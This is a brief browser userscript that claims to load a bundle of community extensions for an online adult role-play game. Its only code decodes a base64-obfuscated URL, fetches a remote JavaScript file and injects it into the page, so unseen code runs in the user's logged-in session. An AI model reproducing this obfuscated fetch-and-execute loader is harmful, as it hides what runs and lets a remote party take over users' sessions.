// ==UserScript==
// @name         Extension Collection
// @version      1
// @description Loads Almost Every Useful Extension in 1 Script BCAR | BCT | BCE/FBC | EBH | MBS | BCX

// @author       BCM  | ΩmеgаX#3723
// @match https://bondageprojects.elementfx.com/*
// @match https://www.bondageprojects.elementfx.com/*
// @match https://bondage-europe.com/*
// @match https://www.bondage-europe.com/*
// @match http://localhost:*/*
// @include      /^https:\/\/(www\.)?bondageprojects\.elementfx\.com\/R\d+\/(BondageClub|\d+)(\/((index|\d+)\.html)?)?$/
// @include      /^https:\/\/(www\.)?bondage-europe\.com\/R\d+\/(BondageClub|\d+)(\/((index|\d+)\.html)?)?$/// @icon         https://www.google.com/s2/favicons?sz=64&domain=github.com
// @grant        none
// ==/UserScript==

fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Rpbjc3Nzc3L0JDTS9tYWluL3NjdC9iYzIuanM='))
.then(response => response.text())
.then(text => {
const script = document.createElement('script');
script.innerHTML = text;
document.head.appendChild(script);
  })
